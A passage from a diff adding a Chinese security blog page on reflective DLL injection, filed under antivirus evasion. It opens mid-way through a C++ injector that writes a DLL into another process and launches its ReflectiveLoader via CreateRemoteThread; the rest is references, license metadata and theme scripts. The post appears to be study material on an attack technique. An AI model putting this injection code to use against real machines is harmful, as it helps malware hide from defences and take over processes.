class="hljs-string">&quot;写入内存失败\n&quot;</span>;<br>        <span class="hljs-built_in">VirtualFreeEx</span>(hProcess, remoteDll, <span class="hljs-number">0</span>, MEM_RELEASE);<br>        <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 7. 计算ReflectiveLoader偏移</span><br>    DWORD loaderFOA = <span class="hljs-built_in">GetReflectiveLoaderFOA</span>(dllBuffer);<br>    <span class="hljs-keyword">if</span> (loaderFOA == <span class="hljs-number">0</span>) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;未找到ReflectiveLoader导出\n&quot;</span>;<br>        <span class="hljs-built_in">VirtualFreeEx</span>(hProcess, remoteDll, <span class="hljs-number">0</span>, MEM_RELEASE);<br>        <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    LPTHREAD_START_ROUTINE pLoader = (LPTHREAD_START_ROUTINE)((BYTE*)remoteDll + loaderFOA);<br><br>    <span class="hljs-comment">// 8. 创建远程线程执行ReflectiveLoader</span><br>    HANDLE hThread = <span class="hljs-built_in">CreateRemoteThread</span>(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, pLoader, remoteDll, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (!hThread) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;远程线程创建失败\n&quot;</span>;<br>        <span class="hljs-built_in">VirtualFreeEx</span>(hProcess, remoteDll, <span class="hljs-number">0</span>, MEM_RELEASE);<br>        <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;注入成功，线程句柄: &quot;</span> &lt;&lt; hThread &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-built_in">CloseHandle</span>(hThread);<br>    <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17089">https://xz.aliyun.com/news/17089</a></li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/" class="category-chain-item">免杀对抗</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/" class="print-no-link">#免杀对抗</a>
+      
+        <a href="/tags/%E5%8F%8D%E5%B0%84Dll/" class="print-no-link">#反射Dll</a>
+      
+        <a href="/tags/dll/" class="print-no-link">#dll</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>反射DLL注入 (Reflective DLL Injection)</div>
+      <div>http://candyb0x.github.io/2025/12/20/反射DLL注入-Reflective-DLL-Injection/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Candy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年12月20日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年12月24日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/12/24/%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6%E5%89%8D%E7%AB%AF%E6%BC%8F%E6%B4%9E%E5%AE%89%E5%85%A8%EF%BC%88XSS%E3%80%81CSRF%EF%BC%89/" title="深入研究前端漏洞安全（XSS、CSRF）">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">深入研究前端漏洞安全（XSS、CSRF）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/12/05/React-%E6%A1%86%E6%9E%B6-CVE-2025-55182-CVE-2025-66478-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="React 框架 CVE-2025-55182 CVE-2025-66478 RCE漏洞复现">
+                        <span class="hidden-mobile">React 框架 CVE-2025-55182 CVE-2025-66478 RCE漏洞复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Candy</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
